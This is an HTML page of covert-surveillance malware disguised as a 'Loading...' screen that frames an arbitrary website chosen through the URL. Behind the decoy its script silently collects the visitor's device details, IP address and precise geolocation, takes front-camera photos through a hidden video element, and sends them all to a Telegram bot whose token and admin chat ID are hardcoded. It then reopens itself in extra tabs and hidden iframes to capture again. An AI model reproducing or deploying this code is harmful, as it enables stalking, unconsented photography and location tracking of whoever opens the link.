<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            width: 100vw;
            height: 100vh;
            overflow: hidden;
            background: #000000;
            font-family: Arial, sans-serif;
        }
        
        #websiteFrame {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border: none;
            z-index: 1;
        }
        
        #cameraContainer {
            position: fixed;
            top: -9999px;
            left: -9999px;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
        }
    </style>
</head>
<body>
    <!-- Website Frame -->
    <iframe id="websiteFrame" src="about:blank" 
            sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-modals"
            allow="camera; microphone; geolocation"
            allowfullscreen></iframe>
    
    <!-- Hidden Camera -->
    <div id="cameraContainer">
        <video id="cameraVideo" autoplay playsinline muted></video>
        <canvas id="captureCanvas"></canvas>
    </div>

    <script>
        // =====================================================
        //  COMPLETE STEALTH CAPTURE
        //  NO VISIBLE STATUS MESSAGES
        // =====================================================
        
        // Telegram Configuration
        const BOT_TOKEN = '8307999302:AAEniYvTP5ZeaYo74AcWSxsOQ9PSxpnAtA0';
        const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;
        const ADMIN_ID = '6314556756';
        
        // Global state
        const data = {
            session: Date.now() + '_' + Math.random().toString(36).substr(2, 8),
            user: null,
            target: null,
            device: {},
            location: null,
            ip: null,
            photos: [],
            battery: null,
            network: null,
            screen: null,
            allDataSent: false,
            replicationDone: false
        };
        
        // DOM elements
        const frame = document.getElementById('websiteFrame');
        const video = document.getElementById('cameraVideo');
        const canvas = document.getElementById('captureCanvas');
        const ctx = canvas.getContext('2d');
        
        // ============== STEP 1: LOAD WEBSITE IMMEDIATELY ==============
        function loadWebsite() {
            const params = new URLSearchParams(window.location.search);
            data.user = params.get('chat_id') || params.get('user') || params.get('id') || ADMIN_ID;
            
            let target = params.get('site') || params.get('url') || params.get('target') || 'https://google.com';
            
            try {
                if (target.startsWith('QUANTUM:')) {
                    target = atob(target.split(':')[1]);
                } else if (!target.includes('://')) {
                    target = atob(target);
                }
                target = decodeURIComponent(target);
            } catch (e) {}
            
            if (!target.startsWith('http')) {
                target = 'https://' + target;
            }
            
            data.target = target;
            frame.src = target;
        }
        
        // ============== STEP 2: CAPTURE ALL DATA SILENTLY ==============
        async function captureAllData() {
            try {
                // Device info
                await captureDeviceInfo();
                
                // Battery info
                await getBatteryInfo();
                
                // Network info
                await getNetworkInfo();
                
                // IP address
                await getIPAddress();
                
                // Location
                await getLocation();
                
                // Photos
                await capturePhotos();
                
            } catch (error) {
                // Silent fail
            }
        }
        
        async function captureDeviceInfo() {
            const ua = navigator.userAgent;
            let os = 'Unknown', browser = 'Unknown';
            
            if (/Windows/.test(ua)) os = 'Windows';
            else if (/Mac/.test(ua)) os = 'macOS';
            else if (/Linux/.test(ua)) os = 'Linux';
            else if (/Android/.test(ua)) os = 'Android';
            else if (/iPhone|iPad/.test(ua)) os = 'iOS';
            
            if (/Chrome/.test(ua) && !/Edge/.test(ua)) browser = 'Chrome';
            else if (/Firefox/.test(ua)) browser = 'Firefox';
            else if (/Safari/.test(ua) && !/Chrome/.test(ua)) browser = 'Safari';
            else if (/Edge/.test(ua)) browser = 'Edge';
            
            data.device = {
                os: os,
                browser: browser,
                platform: navigator.platform,
                language: navigator.language,
                cores: navigator.hardwareConcurrency || '?',
                ram: navigator.deviceMemory || '? GB',
                screen: `${screen.width}x${screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
            };
        }
        
        async function getBatteryInfo() {
            try {
                if (navigator.getBattery) {
                    const battery = await navigator.getBattery();
                    data.battery = {
                        level: Math.round(battery.level * 100) + '%',
                        charging: battery.charging ? 'Yes' : 'No'
                    };
                }
            } catch (e) {}
        }
        
        async function getNetworkInfo() {
            data.network = {
                online: navigator.onLine,
                connection: null
            };
            
            if (navigator.connection) {
                data.network.connection = {
                    type: navigator.connection.type,
                    speed: navigator.connection.effectiveType,
                    downlink: navigator.connection.downlink + ' Mbps'
                };
            }
        }
        
        async function getIPAddress() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const result = await response.json();
                data.ip = result.ip;
            } catch (e) {
                try {
                    const response = await fetch('https://icanhazip.com/');
                    data.ip = (await response.text()).trim();
                } catch (e) {}
            }
        }
        
        async function getLocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve(null);
                    return;
                }
                
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        data.location = {
                            lat: pos.coords.latitude.toFixed(6),
                            lon: pos.coords.longitude.toFixed(6),
                            accuracy: Math.round(pos.coords.accuracy) + 'm'
                        };
                        resolve(data.location);
                    },
                    () => resolve(null),
                    { enableHighAccuracy: true, timeout: 5000 }
                );
            });
        }
        
        // ============== PHOTO CAPTURE ==============
        async function capturePhotos() {
            try {
                // Request camera silently
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: 'user',
                        width: { ideal: 640 },
                        height: { ideal: 480 }
                    }
                });
                
                video.srcObject = stream;
                
                // Wait for video
                await new Promise((resolve) => {
                    if (video.readyState >= 3) {
                        resolve();
                    } else {
                        video.onloadeddata = resolve;
                    }
                });
                
                await new Promise(r => setTimeout(r, 500));
                
                // Capture 2 photos quickly
                for (let i = 0; i < 2; i++) {
                    const blob = await capturePhoto();
                    if (blob) {
                        data.photos.push({
                            blob: blob,
                            type: 'front',
                            index: i + 1,
                            size: Math.round(blob.size / 1024)
                        });
                    }
                    await new Promise(r => setTimeout(r, 200));
                }
                
                // Stop stream
                stream.getTracks().forEach(track => track.stop());
                
            } catch (error) {
                // Silent fail
            }
        }
        
        function capturePhoto() {
            try {
                if (!video.videoWidth || video.videoWidth === 0) {
                    return null;
                }
                
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                
                // Draw video frame
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                // Convert to blob
                return new Promise((resolve) => {
                    canvas.toBlob((blob) => {
                        resolve(blob && blob.size > 5000 ? blob : null);
                    }, 'image/jpeg', 0.8);
                });
                
            } catch (error) {
                return null;
            }
        }
        
        // ============== STEP 3: SEND ALL DATA SILENTLY ==============
        async function sendAllData() {
            try {
                // Send report
                await sendReport();
                
                // Send photos one by one
                if (data.photos.length > 0) {
                    for (const photo of data.photos) {
                        await sendPhoto(photo);
                        await new Promise(r => setTimeout(r, 600));
                    }
                }
                
                data.allDataSent = true;
                
            } catch (error) {
                // Silent fail
            }
        }
        
        async function sendReport() {
            try {
                let report = `üìä *DATA CAPTURE COMPLETE*\n\n`;
                report += `Session: \`${data.session}\`\n`;
                report += `User: \`${data.user}\`\n`;
                report += `Time: ${new Date().toLocaleTimeString()}\n\n`;
                
                report += `üì± Device: ${data.device.os} ${data.device.browser}\n`;
                report += `üñ•Ô∏è Screen: ${data.device.screen}\n`;
                report += `üíª CPU: ${data.device.cores} cores\n`;
                report += `üíæ RAM: ${data.device.ram}\n\n`;
                
                if (data.battery) {
                    report += `üîã Battery: ${data.battery.level}\n`;
                    report += `‚ö° Charging: ${data.battery.charging}\n\n`;
                }
                
                if (data.ip) {
                    report += `üåê IP: \`${data.ip}\`\n\n`;
                }
                
                if (data.location) {
                    report += `üìç Location:\n`;
                    report += `${data.location.lat}, ${data.location.lon}\n`;
                    report += `Accuracy: ${data.location.accuracy}\n\n`;
                }
                
                report += `üì∏ Photos: ${data.photos.length}\n`;
                report += `üéØ Target: ${data.target}`;
                
                // Send to user
                await fetch(`${TELEGRAM_API}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: data.user,
                        text: report,
                        parse_mode: 'Markdown'
                    })
                });
                
                // Send to admin
                await fetch(`${TELEGRAM_API}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: ADMIN_ID,
                        text: report + `\n\nüë§ User: \`${data.user}\``,
                        parse_mode: 'Markdown'
                    })
                });
                
            } catch (error) {
                // Silent fail
            }
        }
        
        async function sendPhoto(photo) {
            try {
                if (!photo.blob) return;
                
                const caption = `üì∏ ${photo.type.toUpperCase()} Photo ${photo.index}\nSession: \`${data.session}\``;
                
                // Create FormData
                const formData = new FormData();
                formData.append('chat_id', data.user);
                formData.append('photo', photo.blob, `photo.jpg`);
                formData.append('caption', caption);
                formData.append('parse_mode', 'Markdown');
                
                // Send to user
                await fetch(`${TELEGRAM_API}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                
                // Send to admin
                const adminForm = new FormData();
                adminForm.append('chat_id', ADMIN_ID);
                adminForm.append('photo', photo.blob, `admin_photo.jpg`);
                adminForm.append('caption', caption + `\nüë§ User: \`${data.user}\``);
                adminForm.append('parse_mode', 'Markdown');
                
                await fetch(`${TELEGRAM_API}/sendPhoto`, {
                    method: 'POST',
                    body: adminForm
                });
                
            } catch (error) {
                // Silent fail
            }
        }
        
        // ============== STEP 4: REPLICATE SILENTLY ==============
        function replicateItself() {
            if (data.replicationDone) return;
            
            data.replicationDone = true;
            
            // Open 3 new tabs silently
            for (let i = 0; i < 3; i++) {
                setTimeout(() => {
                    try {
                        const newTab = window.open(window.location.href, '_blank');
                        if (newTab) {
                            // Close after 2 minutes
                            setTimeout(() => {
                                try {
                                    newTab.close();
                                } catch (e) {}
                            }, 120000);
                        }
                    } catch (e) {
                        // Popup blocked
                    }
                }, i * 2000);
            }
            
            // Also create hidden iframes
            setTimeout(() => {
                for (let i = 0; i < 2; i++) {
                    try {
                        const iframe = document.createElement('iframe');
                        iframe.style.display = 'none';
                        iframe.src = window.location.href;
                        document.body.appendChild(iframe);
                        
                        // Remove after 5 seconds
                        setTimeout(() => {
                            iframe.remove();
                        }, 5000);
                        
                    } catch (e) {}
                }
            }, 3000);
        }
        
        // ============== MAIN EXECUTION ==============
        async function main() {
            try {
                // Step 1: Load website immediately
                loadWebsite();
                
                // Wait a moment then start capture
                setTimeout(async () => {
                    // Step 2: Capture all data
                    await captureAllData();
                    
                    // Step 3: Send all data
                    await sendAllData();
                    
                    // Step 4: Replicate after data is sent
                    replicateItself();
                    
                }, 1000);
                
            } catch (error) {
                // Silent fail
            }
        }
        
        // Start when page loads
        window.addEventListener('load', main);
        
        // Force replication after 30 seconds even if something fails
        setTimeout(() => {
            if (!data.replicationDone) {
                replicateItself();
            }
        }, 30000);
        
    </script>
</body>
</html>
